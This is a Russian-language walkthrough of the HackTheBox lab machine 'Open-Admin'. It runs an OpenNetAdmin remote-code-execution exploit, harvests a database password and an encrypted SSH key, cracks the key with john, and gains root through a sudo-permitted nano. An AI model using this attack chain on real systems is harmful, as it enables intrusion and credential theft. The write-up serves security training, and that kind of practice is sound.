# Open-Admin
## HTB machine

- Название: Open-Admin  
- OS: Linux
- Ресурс: HackTheBox
- Сложность: Easy
- Дата релиза: 4.01.20

## Write-up

```html
root@kali:~# nmap -sC -sV 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-02 09:01 EDT
Warning: 10.10.10.171 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.171
Host is up (0.10s latency).
Not shown: 846 closed ports, 152 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.11 seconds
```

> Ничего интересного.

```html
root@kali:~# dirb http://10.10.10.171/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  2 10:00:06 2020
URL_BASE: http://10.10.10.171/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4613                                                          

---- Scanning URL: http://10.10.10.171/ ----
==> DIRECTORY: http://10.10.10.171/ona/                                        
==> DIRECTORY: http://10.10.10.171/artwork/                                    
==> DIRECTORY: http://10.10.10.171/music/
```

>Среди прочего, только один каталог представляет интерес, просканим и его на всякий:

```html
root@kali:~/Downloads# dirb http://10.10.10.171/ona/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  2 10:02:02 2020
URL_BASE: http://10.10.10.171/ona/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4613                                                          

---- Scanning URL: http://10.10.10.171/ona/ ----
+ http://10.10.10.171/ona/a (CODE:200|SIZE:2)                                  
==> DIRECTORY: http://10.10.10.171/ona/config/                                 
==> DIRECTORY: http://10.10.10.171/ona/images/                                 
==> DIRECTORY: http://10.10.10.171/ona/include/                                
+ http://10.10.10.171/ona/index.php (CODE:200|SIZE:25070)                      
==> DIRECTORY: http://10.10.10.171/ona/local/                                  
==> DIRECTORY: http://10.10.10.171/ona/modules/                                
==> DIRECTORY: http://10.10.10.171/ona/plugins/
```

>Тоже ничего, но на главной странице /ona указана устаревшая версия OpenNetAdmin 18.1.1. Найти эксплойт не составило труда - https://www.exploit-db.com/exploits/47691
>Сделаем файл исполняемым и запустим:

```html
root@kali:~# ./exp.sh http://10.10.10.171/ona/
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

>Через удаленное выполнение кода получен доступ к оболочке. Но мы не можем покинуть текущий каталог, поэтому придется искать таким образом:

```html
$ ls -l /opt/ona/www/local/config/
total 8
-rw-r--r-- 1 www-data www-data  426 Nov 21 16:51 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21 16:28 run_installer
```

>Спустя некоторое время нашелся файл с информацией для следующего шага:

```html
$ cat /opt/ona/www/local/config/database_settings.inc.php
?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => '<mark>n1nj4W4rri0R!</mark>',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

>Осталось узнать кому принадлежит этот пароль, для этого воспользуемся следующей утилитой:

```html
$ w
 14:32:26 up  1:11,  4 users,  load average: 0.85, 5.34, 6.79
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
jimmy    pts/0    10.10.15.159     13:23    7.00s  0.08s  0.08s -bash
joanna   pts/1    10.10.16.23      13:32   19:44   0.21s  0.00s sh
joanna   pts/3    10.10.14.171     14:15    5:22   0.07s  0.02s /bin/nano /opt/priv
jimmy    pts/5    10.10.15.146     14:21   25.00s  0.16s  0.16s -bash
```

>Так мы сможем просмотреть пользователей, которые в данный момент активны. Ну или посмотреть историю входа в систему с помощью "last -a"
>Перебором входим как jimmy:

```html
jimmy@openadmin://var/www/internal$ cat main.php
?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "pre $output /pre";
?
Don't forget your "ninja" password
```

>Файл "index.php" содержит в себе команду на чтение файла id_rsa, который нам нужен. Но при попытке обращения получаем 404.

```html
jimmy@openadmin://var/www/internal$ curl http://localhost/main.php
DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
title 404 Not Found /title
p The requested URL was not found on this server. /p
address Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 80 /address
```

>Попробуем с другими портами, для этого выполним команду netstat, чтобы просмотреть подключения. Флаг "-tul" - это объединение -t(TCP соединения), -u(UDP соединения), -l(все открытые порты):

```html
jimmy@openadmin://var/www/internal$ netstat -tul
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:mysql         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:<mark>52846</mark>         0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:http               [::]:*                  LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:* 
```

>Пробуем:

```html
jimmy@openadmin://var/www/internal$ curl http://localhost:52846/main.php
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
Don't forget your "ninja" password
```

>Скопируем приватный ключ в новый файл "rsa" и попробуем выудить из него полезное:

```html
root@kali:~# python3 /usr/share/john/ssh2john.py rsa > rsa.hash
/usr/share/john/ssh2john.py:103: DeprecationWarning: decodestring() is a deprecated alias since Python 3.1, use decodebytes()
  data = base64.decodestring(data)

root@kali:~# john --wordlist=rockyou.txt rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (rsa)
1g 0:00:00:09 DONE (2020-04-02 11:11) 0.1030g/s 1478Kp/s 1478Kc/s 1478KC/sa6_123..*7¡Vamos!
Session completed
```

>Далее с помощью ключа и пароля войдем как joanna:

```html
root@kali:~# chmod 700 rsa
root@kali:~# ssh -i rsa joanna@10.10.10.171
Enter passphrase for key 'rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

41 packages can be updated.
12 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr  2 15:16:06 2020 from 10.10.14.218
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt
c9b2cf07d40807e62af626**********
```

>Остался только рут, посмотрим что мы можем от него запускать:

```html
joanna@openadmin://$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

>Редактор nano и файл priv, попробуем прочесть root.txt из файла priv:

```html
joanna@openadmin://$ sudo /bin/nano opt/priv
```

>Далее жмем ctrl+R чтобы прочесть другой файл.

```html
File to insert [from ./]: root/root.txt:
2f907ed450b361b2c2bf4e**********
```





